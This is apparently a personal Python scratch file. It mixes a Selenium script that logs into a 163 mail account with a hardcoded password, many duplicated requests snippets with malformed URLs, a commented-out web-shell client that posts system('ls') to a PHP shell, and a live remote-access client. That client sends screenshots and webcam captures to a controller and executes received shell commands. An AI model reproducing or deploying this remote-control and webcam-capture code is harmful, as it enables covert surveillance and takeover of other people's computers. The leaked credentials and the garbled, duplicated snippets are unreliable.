'''from selenium import webdriver
from time import sleep

browser = webdriver.Edge()
browser.get("https://mail.163.com/")
# browser.maximize_window()
#转化登录方式之后，要进入iframe框
browser.switch_to.frame(browser.find_element_by_xpath('//iframe[starts-with(@id,"x-URS")]'))
sleep(1)

browser.find_element_by_xpath('//input[@name="email"]').send_keys('wwwljstljst@163.com')
browser.find_element_by_xpath('//input[@name="password"]').send_keys('baojiewendfb10a')
browser.find_element_by_xpath('//*[@id="dologin"]').click()

sleep(2)
print(browser.page_source)
sleep(3)
browser.quit()
#!/usr/bin/python
# coding=utf-8
import requests
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("www.baidu.com", headers=headers)
print(response.text)
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
import requests
 
headers = {
 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'
}
response = requests.get("发现 - 知乎", headers=headers)
print(response.text)
''''''
import requests
url="http://192.168.10.1"
shell='/system.php'
passwd="pass"
port='80'
payload={
    passwd:'system(\'ls \');'
}
url1=url+':'+port+shell
print(url1)
response=requests.post(url1,payload,timeout=1)
print(response.text)
import socket
import sys
import os


class server:
    def __init__(self, ip, port):
        self.port = port
        self.ip = ip
        self.bufferSize = 10240

    def start(self):  # 启动监听，接收数据
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.bind((self.ip, self.port))  # 绑定
            s.listen(10)  # 监听
            print('等待客户端连接')
            while True:  # 一直等待新的连接
                try:
                    conn, addr = s.accept()  # 接收连接
                    print('客户端连接 ' + addr[0] + ':' + str(addr[1]))
                    while True:  # 保持长连接
                        data = conn.recv(self.bufferSize)#接收数据
                        if not data:#断开连接时退出当前循环
                            break
                        else:
                            self.executeCommand(conn,data)
                    conn.close()#关闭当前连接
                except socket.error as e:
                    print(e)
                    conn.close()  # 关闭连接
        finally:
            s.close()  # 关闭服务端

    def executeCommand(self, tcpCliSock, data):  # 解析并执行命令
        try:#
             message = data.decode("utf-8")
             if os.path.isfile(message):#判断是否是文件
                filesize = str(os.path.getsize(message))#获取文件大小
                print("文件大小为：",filesize)
                tcpCliSock.send(filesize.encode())#发送文件大小
                data = tcpCliSock.recv(self.bufferSize)
                print("开始发送")
                f = open(message, "rb")#打开文件
                for line in f:
                    tcpCliSock.send(line)#发送文件内容
        except:
            raise


  if __name__ == '__main__':
    s = server('', 8800)
    s.start()'''
import os
from sqlite3 import connect
from time import sleep
import pyautogui
'''
Fuction：客户端发送图片和数据
Date：2018.9.8
Author：snowking
'''
###客户端client.py
import socket
import sys
import struct
import _thread
host=socket.gethostname()#"192.168.10.22"
def screenshot():
    im = pyautogui.screenshot()
    im.save("py.jpg")
    return "py.jpg"
def camerashot():
    import cv2
    cap=cv2.VideoCapture(0,cv2.CAP_DSHOW)      
    # 将摄像头中的一帧图片数据保存
    f, frame = cap.read()      
    # 将图片保存为本地文件
    cv2.imwrite('image.jpg', frame)    
    # 关闭摄像头
    return "image.jpg"
def sock_client_image(position):#截取快照模块
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, 6666))  #服务器和客户端在不同的系统或不同的主机下时使用的ip和端口，首先要查看服务器所在的系统网卡的ip
            # s.connect(('127.0.0.1', 6666))  #服务器和客户端都在一个系统下时使用的ip和端口
        except socket.error as msg:
            print(msg)
            print(sys.exit(1))
        filepath = position  #输入当前目录下的图片名 xxx.jpg
        fhead = struct.pack(b'128sq', bytes(os.path.basename(filepath), encoding='utf-8'), os.stat(filepath).st_size)  #将xxx.jpg以128sq的格式打包
        s.send(fhead)

        fp = open(filepath, 'rb')  #打开要传输的图片
        while True:
            data = fp.read(1024) #读入图片数据
            if not data:
                #print('{0} send over...'.format(filepath))
                break
            s.send(data)  #以二进制格式发送图片数据
        s.close()
        return position
        break    #循环发送
        


if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# 创建 socket 对象
    port = 9999# 设置端口号
    try:
        s.connect((host, port))# 连接服务，指定主机和端口
    except socket.error as ermsg:
        print(ermsg)
        print(sys.exit(1))
    while True:
        msg = s.recv(1024).decode('utf-8')# 接收小于 1024 字节的数据
        if msg=="exit":#退出
            s.close()
            sys.exit(0)
        if msg =="sshot":#截屏
            p=sock_client_image(screenshot())
            os.system("del "+p)
            continue
        if msg=="cshot":
             p=sock_client_image(camerashot())
             os.system("del "+p)
             continue
        if '@' in msg:
            #print(msg)
            os.system(msg.rstrip('@'))
            continue
        if msg=="!":
            while True:
                 ms  = s.recv(1024).decode('utf-8')# 接收小于 1024 字节的数据
                 os.system(ms)
                 #sock_client_image()
                 if "不是"in os.popen(ms).read():              
                     s.send(("None").encode('utf-8'))
                 if ms=="exit":
                      break
                 else:
                     print(os.popen(ms).read())
                     s.send((os.popen(ms).read()).encode('utf-8'))
                 
            continue
                             